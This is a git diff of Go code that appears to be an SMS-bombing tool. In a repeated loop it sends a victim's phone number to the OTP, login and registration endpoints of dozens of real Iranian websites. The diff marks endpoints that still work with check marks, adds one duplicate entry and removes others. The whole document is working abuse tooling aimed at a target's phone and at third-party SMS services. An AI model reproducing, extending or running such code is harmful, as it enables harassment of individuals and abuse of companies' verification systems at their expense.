@@ -482,7 +482,7 @@ cookieJar, _ := cookiejar.New(nil)
 
 	for i := 0; i < repeatCount; i++ {
 		
-               // darsban.com (JSON)
+               // darsban.com (JSON) ✅ 
                wg.Add(1)
                tasks <- func(c *http.Client) func() {
                         return func() {
@@ -493,7 +493,8 @@ cookieJar, _ := cookiejar.New(nil)
                 sendJSONRequest(c, ctx, "https://www.darsban.com/api/usersmslogin", payload, &wg, ch)
                 }
         }(client)
-		// novinparse.com (SMS - POST Form)
+
+		// novinparse.com (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -508,7 +509,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-               // Fitamin.ir (JSON Request)
+               // Fitamin.ir (JSON Request) ✅ 
                wg.Add(1)
                tasks <- func(c *http.Client) func() {
 	               return func() {
@@ -527,7 +528,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
 			}
 		}(client)
-                //gama.ir
+                //gama.ir ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -573,7 +574,8 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
-		//karnameh.com
+
+		//karnameh.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -714,7 +716,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// apigateway.fadaktrains.com 
+		// apigateway.fadaktrains.com  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -724,7 +726,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://apigateway.fadaktrains.com/api/auth/otp", payload, &wg, ch)
 			}
 		}(client)
-		//  api.faradars.org (POST JSON)
+		//  api.faradars.org (POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -779,7 +781,7 @@ cookieJar, _ := cookiejar.New(nil)
 		}(client)
 
 
-		// sanjagh.pro (POST JSON)
+		// sanjagh.pro (POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -801,7 +803,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
 			}
 		}(client)
-		//  zarinplus.com (JSON)
+		//  zarinplus.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -880,7 +882,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// (Torob) - GET
+		// (Torob) - GET ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -890,7 +892,7 @@ cookieJar, _ := cookiejar.New(nil)
 		}(client)
 
 
-		// (DrNext) - POST JSON
+		// (DrNext) - POST JSON ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -901,7 +903,17 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", payload, &wg, ch)
 			}
 		}(client)
-		// skmei-iran.com
+
+		// drnext.ir (JSON) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+		// skmei-iran.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1339,7 +1351,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
-		// https://www.drsaina.com/ (GET)
+		// https://www.drsaina.com/ (GET) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1367,7 +1379,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// https://gharar.ir/users/phone_number/ (Form Data)
+		// https://gharar.ir/users/phone_number/ (Form Data) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1532,7 +1544,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// sabziman.com
+		// sabziman.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1552,17 +1564,6 @@ cookieJar, _ := cookiejar.New(nil)
 				}
 				urlWithQuery := "https://api.achareh.co/v2/accounts/login/?web=true"
 				sendJSONRequest(c, ctx, urlWithQuery, payload, &wg, ch) 
-			}
-		}(client) 
-
-		// sabziman.com (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "newphoneexist")
-				formData.Set("phonenumber", phone)
-				sendFormRequest(c, ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
 
@@ -2109,31 +2110,12 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// irantic.com (JSON) 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) 
 
 		// basalam.com (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
 				sendJSONRequest(c, ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) 
-
-		// drnext.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{ 
 					"mobile": phone,
 				}, &wg, ch)
 			}
